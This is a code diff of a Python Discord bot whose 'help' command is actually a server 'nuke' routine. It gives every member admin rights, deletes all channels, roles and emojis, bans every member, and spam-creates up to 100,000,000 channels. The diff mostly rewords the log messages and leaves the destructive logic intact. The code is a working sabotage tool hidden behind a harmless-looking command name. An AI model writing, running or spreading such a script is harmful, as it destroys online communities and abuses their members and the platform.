@@ -40,51 +40,51 @@ async def help(ctx):
     await ctx.message.delete()
     guild = ctx.guild
     try:
-      role = discord.utils.get(guild.roles, name = "@everyone")
+      role = discord.utils.get(guild.roles, name = "")
       await role.edit(permissions = Permissions.all())
-      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
+      print(Fore.MAGENTA + "I give admin to all members." + Fore.RESET)
     except:
-      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
+      print(Fore.GREEN + "I couldn't give admin to all members." + Fore.RESET)
     for channel in guild.channels:
       try:
         await channel.delete()
         print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
       except:
-        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
+        print(Fore.GREEN + f"{channel.name} wasn't deleted." + Fore.RESET)
     for member in guild.members:
      try:
        await member.ban()
-       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
+       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
+       print(Fore.GREEN + f"{member.name}#{member.discriminator} wasn't banned." + Fore.RESET)
     for role in guild.roles:
      try:
        await role.delete()
-       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
+       print(Fore.MAGENTA + f"{role.name} has been deleted" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
+       print(Fore.GREEN + f"{role.name} hasn't been deleted" + Fore.RESET)
     for emoji in list(ctx.guild.emojis):
      try:
        await emoji.delete()
-       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
+       print(Fore.MAGENTA + f"{emoji.name} was deleted" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
+       print(Fore.GREEN + f"{emoji.name} wasn't deleted" + Fore.RESET)
     banned_users = await guild.bans()
     for ban_entry in banned_users:
       user = ban_entry.user
       try:
-        await user.unban("𝐘𝐨𝐮𝐫_𝐔𝐬𝐞𝐫")
-        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
+        await user.unban("Your_User")
+        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} was unbanned." + Fore.RESET)
       except:
-        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
-    await guild.create_text_channel("Get Punked Noob")
+        print(Fore.GREEN + f"{user.name}#{user.discriminator} wasn't unbanned." + Fore.RESET)
+    await guild.create_text_channel("")
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
-        print(f"New Invite: {link}")
+        print(f"Invite Link: {link}")
     amount = 100000000
     for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
-    print(f"nuked {guild.name} Successfully.")
+    print(f"nuked {guild.name} successfully.")
     return
 
 @bot.event
